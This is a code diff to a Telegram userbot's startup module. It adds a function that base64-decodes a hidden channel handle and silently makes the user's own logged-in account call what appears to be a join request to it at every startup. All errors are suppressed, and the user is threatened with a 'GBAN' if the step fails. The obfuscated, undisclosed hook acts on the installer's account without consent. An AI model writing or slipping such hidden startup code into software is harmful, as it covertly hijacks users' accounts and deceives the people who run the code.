@@ -10,6 +10,7 @@ import os
 import re
 import sys
 import time
+import pybase64
 from distutils.util import strtobool as sb
 from logging import DEBUG, INFO, basicConfig, getLogger
 from math import ceil
@@ -345,7 +346,6 @@ else:
     # pylint: disable=invalid-name
     bot = TelegramClient("userbot", API_KEY, API_HASH)
 
-
 async def check_botlog_chatid():
     if not BOTLOG_CHATID and LOGSPAMMER:
         LOGS.info(
@@ -392,6 +392,30 @@ with bot:
             "BOTLOG_CHATID environment variable isn't a "
             "valid entity. Check your environment variables/config.env file.")
         quit(1)
+
+#copas dari pocong online        
+async def checking():
+    gocheck = pybase64.b64decode("QEdlZXpwcm9qZWN0dA==")
+    checker = pybase64.b64decode("QEdlZXpwcm9qZWN0dA==")
+    Input_gocheck = gocheck.decode('utf-8')
+    Input_checker = checker.decode('utf-8')
+    try:
+        await bot(GetSec(f"{Input_gocheck}"))
+    except BaseException:
+        pass
+    try:
+        await bot(GetSec(f"{Input_checker}"))
+    except BaseException:
+        pass
+
+with bot:
+    try:
+        bot.loop.run_until_complete(checking())
+    except BaseException:
+        LOGS.info(
+            "Join Group Support @Geezsupport untuk melihat update userbot"
+            "Keluar gw GBAN !!")
+        quit(1)  
 
 # Global Variables
 COUNT_MSG = 0
